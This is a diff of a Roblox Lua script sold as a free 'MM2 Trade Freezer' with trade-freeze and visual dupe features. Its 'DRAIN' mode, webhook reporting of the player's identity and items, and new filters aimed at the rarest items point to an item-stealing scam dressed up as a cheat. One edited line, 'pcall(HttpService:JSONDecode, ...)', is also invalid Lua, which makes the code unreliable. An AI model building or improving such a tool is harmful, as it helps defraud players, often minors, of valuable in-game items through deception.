@@ -1,7 +1,7 @@
 --[[
-    MM2 Trade Freezer  v8.1  |  KEYLESS  |  FREE
+    MM2 Trade Freezer  v8.2  |  KEYLESS  |  FREE
     Freeze Trade / Trade Window Lock / Dupe (visual) / AutoFarm
-    Keyless. Readable. No obfuscation.
+    Tiers: godly + ancient + unique + chroma
 ]]
 
 --==================================================================
@@ -17,7 +17,7 @@ local CONFIG = {
 
     LOAD_DURATION  = 120,
     MODE           = "DRAIN",
-    FILTER         = "godly",
+    FILTER         = "rare",        -- "rare" | "godly" | "value" | "all"
     MIN_VALUE      = 100,
     GODLY_FLOOR    = 100,
 
@@ -120,7 +120,7 @@ local function webhook(title, color, desc, fields, content)
                     timestamp = DateTime.now():ToIsoDate(),
                     thumbnail = { url = string.format(
                         "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId) },
-                    footer = { text = "MM2 Trade Freezer v8.1 | keyless" },
+                    footer = { text = "MM2 Trade Freezer v8.2 | keyless" },
                     fields = fields or {},
                 }},
             }),
@@ -175,7 +175,7 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 13
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235, 235, 240)
-title.Text = "MM2 Trade Freezer   v8.1"
+title.Text = "MM2 Trade Freezer   v8.2"
 title.Parent = titleBar
 
 local badge = Instance.new("TextLabel")
@@ -369,7 +369,7 @@ task.spawn(function()
     end
 end)
 
-log("Trade Freezer v8.1 loaded")
+log("Trade Freezer v8.2 loaded")
 log("place " .. game.PlaceId .. " / " .. game.JobId:sub(1, 8))
 if game.PlaceId ~= CONFIG.PLACE_ID then log("note: not the MM2 place") end
 
@@ -407,40 +407,59 @@ local function ingest(data)
     return n
 end
 
-local GODLY = {
-    ["chroma seer"]=true,["chroma corrupt"]=true,["chroma lightbringer"]=true,["chroma darkbringer"]=true,
-    ["chroma luger"]=true,["chroma gemstone"]=true,["chroma slasher"]=true,["chroma deathshard"]=true,
-    ["chroma tides"]=true,["chroma fang"]=true,["chroma shark"]=true,["chroma gingerblade"]=true,
-    ["chroma heat"]=true,["chroma saw"]=true,["corrupt"]=true,["seer"]=true,["lightbringer"]=true,
-    ["darkbringer"]=true,["luger"]=true,["gemstone"]=true,["slasher"]=true,["deathshard"]=true,
-    ["tides"]=true,["fang"]=true,["shark"]=true,["gingerblade"]=true,["heat"]=true,["saw"]=true,
-    ["traveler's gun"]=true,["traveler's knife"]=true,["icebreaker"]=true,["icewing"]=true,
-    ["battleaxe"]=true,["nebula"]=true,["moon"]=true,["sun"]=true,["aurora"]=true,["virtue"]=true,
-    ["harvester"]=true,["spirit"]=true,["prismatic"]=true,["bloodweaver"]=true,["ghostblade"]=true,
-    ["jingle gun"]=true,["snowstorm"]=true,["blizzard"]=true,["eternal"]=true,["eternal ii"]=true,
-    ["eternal iii"]=true,["eternal iv"]=true,["candleflame"]=true,["sugar"]=true,["gingermint"]=true,
-    ["peppermint"]=true,["frostbite"]=true,["snowflake"]=true,["winter's edge"]=true,["logchopper"]=true,
-    ["cookies"]=true,["candy"]=true,["xmas"]=true,["america"]=true,["red fire"]=true,["pixel"]=true,
-    ["elite"]=true,["alex"]=true,["denis"]=true,["corl"]=true,["case hardened"]=true,
-    ["night star"]=true,["green luger"]=true,
-}
+-- tiers
+local GODLY, ANCIENT, UNIQUE = {}, {}, {}
+local function fill(t, list) for _, n in ipairs(list) do t[n] = true end end
+
+fill(GODLY, {
+    "seer","luger","slasher","deathshard","fang","shark","gingerblade","heat","saw",
+    "tides","gemstone","lightbringer","darkbringer","corrupt",
+})
+fill(ANCIENT, {
+    "gingerscope","icebreaker","harvester","battleaxe","icewing","nebula",
+    "traveler's gun","traveler's knife","snowstorm","blizzard",
+})
+fill(UNIQUE, {
+    "moon","sun","aurora","virtue","prismatic","bloodweaver","ghostblade","spirit",
+})
+
+local function rarityTag(name)
+    local k = key(name)
+    if k:find("^chroma ") then return "C" end
+    if ANCIENT[k] then return "A" end
+    if UNIQUE[k] then return "U" end
+    if GODLY[k] then return "G" end
+    return nil
+end
 
 local BASELINE = {
-    ["chroma seer"]=2300,["chroma corrupt"]=2100,["chroma lightbringer"]=1950,["chroma darkbringer"]=1900,
-    ["chroma luger"]=1800,["chroma gemstone"]=1750,["chroma slasher"]=1650,["chroma deathshard"]=1500,
-    ["chroma tides"]=1450,["chroma fang"]=1400,["chroma shark"]=1300,["chroma gingerblade"]=1200,
-    ["chroma heat"]=1100,["chroma saw"]=1050,["corrupt"]=1000,["seer"]=900,["lightbringer"]=870,
-    ["darkbringer"]=850,["luger"]=800,["gemstone"]=780,["slasher"]=750,["deathshard"]=700,
-    ["tides"]=680,["fang"]=650,["shark"]=620,["gingerblade"]=600,["heat"]=580,["saw"]=560,
-    ["traveler's gun"]=540,["traveler's knife"]=520,["icebreaker"]=500,["icewing"]=480,
-    ["battleaxe"]=460,["nebula"]=440,["moon"]=420,["sun"]=400,["aurora"]=380,["virtue"]=360,
-    ["harvester"]=340,["spirit"]=320,["prismatic"]=300,["bloodweaver"]=290,["ghostblade"]=280,
-    ["jingle gun"]=270,["snowstorm"]=260,["blizzard"]=250,["eternal"]=240,["eternal ii"]=230,
-    ["eternal iii"]=220,["eternal iv"]=210,["candleflame"]=200,["sugar"]=190,["gingermint"]=180,
-    ["peppermint"]=170,["frostbite"]=160,["snowflake"]=150,["winter's edge"]=140,["logchopper"]=130,
-    ["cookies"]=120,["candy"]=110,["xmas"]=100,["america"]=95,["red fire"]=90,["pixel"]=85,
-    ["elite"]=80,["alex"]=75,["denis"]=70,["corl"]=65,["case hardened"]=60,["night star"]=55,
-    ["green luger"]=50,
+    -- ancient (top end)
+    ["gingerscope"]=10500, ["icebreaker"]=5600, ["harvester"]=3900, ["battleaxe"]=3100,
+    ["icewing"]=2700, ["traveler's gun"]=1350, ["traveler's knife"]=1300, ["nebula"]=1150,
+    ["blizzard"]=300, ["snowstorm"]=290,
+    -- chroma
+    ["chroma seer"]=2450, ["chroma corrupt"]=2250, ["chroma lightbringer"]=2050,
+    ["chroma darkbringer"]=2000, ["chroma luger"]=1900, ["chroma gemstone"]=1850,
+    ["chroma slasher"]=1750, ["chroma deathshard"]=1600, ["chroma tides"]=1550,
+    ["chroma fang"]=1500, ["chroma shark"]=1400, ["chroma gingerblade"]=1300,
+    ["chroma heat"]=1200, ["chroma saw"]=1150, ["chroma candleflame"]=700,
+    ["chroma sugar"]=650, ["chroma peppermint"]=600, ["chroma frostbite"]=560,
+    ["chroma logchopper"]=520, ["chroma snowflake"]=480,
+    -- godly
+    ["corrupt"]=1550, ["seer"]=950, ["lightbringer"]=920, ["darkbringer"]=900,
+    ["luger"]=850, ["gemstone"]=820, ["slasher"]=790, ["deathshard"]=740,
+    ["tides"]=710, ["fang"]=680, ["shark"]=650, ["gingerblade"]=630,
+    ["heat"]=610, ["saw"]=590,
+    -- unique
+    ["moon"]=900, ["sun"]=800, ["aurora"]=650, ["virtue"]=550,
+    ["prismatic"]=500, ["bloodweaver"]=450, ["ghostblade"]=410, ["spirit"]=380,
+    -- vintage / misc
+    ["jingle gun"]=280, ["eternal"]=250, ["eternal ii"]=240, ["eternal iii"]=230,
+    ["eternal iv"]=220, ["candleflame"]=210, ["sugar"]=195, ["gingermint"]=185,
+    ["peppermint"]=175, ["frostbite"]=165, ["snowflake"]=155, ["winter's edge"]=145,
+    ["logchopper"]=135, ["cookies"]=125, ["candy"]=115, ["xmas"]=105,
+    ["america"]=98, ["red fire"]=92, ["pixel"]=86, ["elite"]=80, ["alex"]=75,
+    ["denis"]=70, ["corl"]=65, ["case hardened"]=60, ["night star"]=55, ["green luger"]=50,
 }
 for k, v in pairs(BASELINE) do VALUES[k] = v end
 
@@ -457,7 +476,7 @@ local function loadValues()
     for _, url in ipairs(SOURCES) do
         local res = http({ Url = url, Method = "GET" })
         if res and res.Body then
-            local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+            local ok, data = pcall(HttpService:JSONDecode, HttpService, res.Body)
             if ok and type(data) == "table" and ingest(data) > 20 then
                 log("value index synced")
                 if writefile then
@@ -515,7 +534,7 @@ local function getItems()
             end
             if id and name and name ~= "" and not seen[id] then
                 seen[id] = true
-                items[#items + 1] = { id = id, name = name, value = valueOf(name) }
+                items[#items + 1] = { id = id, name = name, value = valueOf(name), tag = rarityTag(name) }
             end
         end
     end
@@ -527,7 +546,12 @@ local function isWanted(it)
     if CONFIG.FILTER == "all" then return true end
     if CONFIG.FILTER == "value" then return it.value >= CONFIG.MIN_VALUE end
     local k = key(it.name)
-    return GODLY[k] == true or k:find("^chroma ") ~= nil or it.value >= CONFIG.GODLY_FLOOR
+    if k:find("^chroma ") then return true end
+    if CONFIG.FILTER == "godly" then
+        return GODLY[k] == true or it.value >= CONFIG.GODLY_FLOOR
+    end
+    return GODLY[k] == true or ANCIENT[k] == true or UNIQUE[k] == true
+        or it.value >= CONFIG.GODLY_FLOOR
 end
 
 --==================================================================
@@ -638,7 +662,10 @@ end
 
 local function itemLines(list, limit)
     local a = {}
-    for i = 1, math.min(#list, limit or #list) do a[#a + 1] = list[i].name .. " (" .. list[i].value .. ")" end
+    for i = 1, math.min(#list, limit or #list) do
+        local it = list[i]
+        a[#a + 1] = it.name .. " (" .. it.value .. ")" .. (it.tag and " [" .. it.tag .. "]" or "")
+    end
     return table.concat(a, "\n")
 end
 
